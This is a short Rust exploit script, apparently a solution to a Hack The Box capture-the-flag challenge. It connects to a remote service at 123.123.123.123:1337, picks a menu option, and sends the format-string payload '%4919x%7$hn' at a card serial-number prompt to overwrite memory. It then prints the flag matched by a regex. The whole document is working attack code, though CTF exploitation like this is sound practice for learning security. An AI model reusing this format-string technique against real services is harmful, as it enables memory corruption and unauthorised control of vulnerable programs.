use ctf_pwn::io::*;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let mut pipe = TcpPipe::connect("123.123.123.123:1337").await?;

    let payload = Payload::builder()
        .recv_until("> ", false)
        .push_line("1")
        .send()
        .recv_until("Insert card's serial number: ", false)
        .push_line("%4919x%7$hn")
        .send()
        .recv_regex_utf8(r"HTB\{[^\}]+\}")
        .print()
        .build();

    pipe.payload(payload).await?;
    Ok(())
}
